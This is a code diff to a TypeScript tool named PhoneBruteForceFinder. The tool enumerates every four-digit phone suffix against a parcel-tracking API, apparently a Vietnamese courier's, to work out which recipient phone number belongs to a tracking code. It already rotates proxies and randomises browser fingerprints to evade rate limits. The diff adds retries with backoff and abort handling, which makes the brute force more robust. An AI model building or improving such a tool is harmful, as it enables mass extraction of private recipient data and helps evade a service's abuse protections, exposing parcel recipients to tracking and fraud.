@@ -25,11 +25,15 @@ export class PhoneBruteForceFinder {
   private headers: Record<string, string>;
   private client: AxiosInstance;
   private onProgressCallback?: (attemptCount: number) => Promise<void>;
+  private abortSignal?: AbortSignal;
+  private maxRetries: number = 2;
+  private retryDelay: number = 1000; // ms
 
-  constructor(onProgressCallback?: (attemptCount: number) => Promise<void>, initialAttemptCount: number = 0) {
+  constructor(onProgressCallback?: (attemptCount: number) => Promise<void>, initialAttemptCount: number = 0, abortSignal?: AbortSignal) {
     this.currentProxyIndex = 0;
     this.attemptCount = initialAttemptCount;
     this.onProgressCallback = onProgressCallback;
+    this.abortSignal = abortSignal;
 
     // User-Agent rotation list
     this.userAgents = [
@@ -130,8 +134,51 @@ export class PhoneBruteForceFinder {
   }
 
   /**
+   * Make HTTP request with retry logic for connection errors
+   */
+  private async makeRequestWithRetry(billcode: string, cellphone: string, proxy: any): Promise<any> {
+    let lastError: any = null;
+
+    for (let attempt = 0; attempt <= this.maxRetries; attempt++) {
+      try {
+        const requestConfig: AxiosRequestConfig = {
+          params: { type: 'track', billcode, cellphone },
+          timeout: 20000 + (attempt * 5000),
+          validateStatus: () => true,
+          headers: {
+            'User-Agent': this.getRandomUserAgent(),
+            'Accept-Language': this.getRandomLanguage(),
+            'sec-ch-ua-platform': this.getRandomPlatform()
+          }
+        };
+
+        if (proxy) {
+          const proxyUrl = `http://${proxy.auth.username}:${proxy.auth.password}@${proxy.hostname}:${proxy.port}`;
+          requestConfig.httpAgent = new HttpProxyAgent(proxyUrl);
+          requestConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
+        }
+
+        return await this.client.get(this.baseUrl, requestConfig);
+      } catch (error: any) {
+        lastError = error;
+        const isRetryable = ['ECONNABORTED', 'ETIMEDOUT', 'ECONNRESET', 'EHOSTUNREACH'].includes(error.code);
+
+        if (attempt < this.maxRetries && isRetryable) {
+          const delay = this.retryDelay * Math.pow(2, attempt);
+          console.log(`   ⚠️  ${cellphone} - Retry ${attempt + 1}/${this.maxRetries} (${error.code}, waiting ${delay}ms)`);
+          await new Promise(resolve => setTimeout(resolve, delay));
+        } else {
+          throw error;
+        }
+      }
+    }
+
+    throw lastError;
+  }
+
+  /**
    * Check if a phone number is valid for a tracking code
-   * by making a request to the API
+   * by making a request to the API with retry logic
    * @param {string} billcode - Tracking number
    * @param {string} cellphone - Last 4 digits
    * @returns {Promise<Object>} Response details
@@ -142,59 +189,22 @@ export class PhoneBruteForceFinder {
     error?: string;
   }> {
     try {
-
-      // Get next proxy if available
       const proxy = this.getNextProxy();
-      const requestConfig: AxiosRequestConfig = {
-        params: { type: 'track', billcode, cellphone },
-        timeout: 15000,
-        validateStatus: () => true,
-        headers: {
-          'User-Agent': this.getRandomUserAgent(),
-          'Accept-Language': this.getRandomLanguage(),
-          'sec-ch-ua-platform': this.getRandomPlatform()
-        }
-      };
+      const response = await this.makeRequestWithRetry(billcode, cellphone, proxy);
 
-      // Add proxy to request if available
-      if (proxy) {
-        const proxyUrl = `http://${proxy.auth.username}:${proxy.auth.password}@${proxy.hostname}:${proxy.port}`;
-
-        requestConfig.httpAgent = new HttpProxyAgent(proxyUrl);
-        requestConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
-      }
-
-      const response = await this.client.get(
-        this.baseUrl,
-        requestConfig
-      );
-
-      // Check if response contains error message about not finding data
-      // Invalid: contains "Không tìm thấy dữ liệu về vận đơn..."
-      // Valid: doesn't contain error message and status 200
       const hasError = JSON.stringify(response.data)?.includes('Không tìm thấy dữ liệu về vận đơn');
 
       if (!hasError && response.status === 200) {
         console.log(`   ✅ ${cellphone} - Valid`);
-        return {
-          status: 'success',
-          isValid: true
-        };
+        return { status: 'success', isValid: true };
       }
 
-      return {
-        status: 'error',
-        isValid: !hasError && response.status === 200,
-      };
-    } catch (error) {
+      return { status: 'error', isValid: !hasError && response.status === 200 };
+    } catch (error: any) {
       const errorMessage = error instanceof Error ? error.message : String(error);
-      const errorCode = error instanceof Error && 'code' in error ? (error as any).code : undefined;
-      console.log(`   ⚠️  ${cellphone} - Error: ${errorCode || errorMessage}`);
-      return {
-        status: 'error',
-        isValid: false,
-        error: errorMessage
-      };
+      const errorCode = error.code || 'UNKNOWN';
+      console.log(`   ❌ ${cellphone} - Failed: ${errorCode}`);
+      return { status: 'error', isValid: false, error: errorMessage };
     }
   }
 
@@ -208,6 +218,9 @@ export class PhoneBruteForceFinder {
     const validPhonesSet = new Set<string>();
 
     for (const phone of phones) {
+      // Check for abort signal
+      this.checkAbort('provided phones check');
+
       const lastFourDigits = String(phone).padStart(4, '0');
       const result = await this.checkPhoneValidity(billcode, lastFourDigits);
 
@@ -245,6 +258,9 @@ export class PhoneBruteForceFinder {
     }
 
     for (let i = startFrom; i < maxAttempts; i++) {
+      // Check for abort signal
+      this.checkAbort('phone validation');
+
       const lastFourDigits = String(i).padStart(4, '0');
       const result = await this.checkPhoneValidity(billcode, lastFourDigits);
 
@@ -289,6 +305,16 @@ export class PhoneBruteForceFinder {
   private logSearchResults(billcode: string, validPhones: Set<string>): void {
     if (validPhones.size > 0) {
       console.log(`✅ Valid phones for ${billcode}: ${Array.from(validPhones).join(', ')}`);
+    }
+  }
+
+  /**
+   * Check if the job has been aborted and should stop
+   */
+  private checkAbort(context: string = 'brute force'): void {
+    if (this.abortSignal?.aborted) {
+      console.log(`🛑 [SCAN PHONE] Abort signal received during ${context}, stopping job...`);
+      throw new Error('JOB_ABORTED');
     }
   }
 
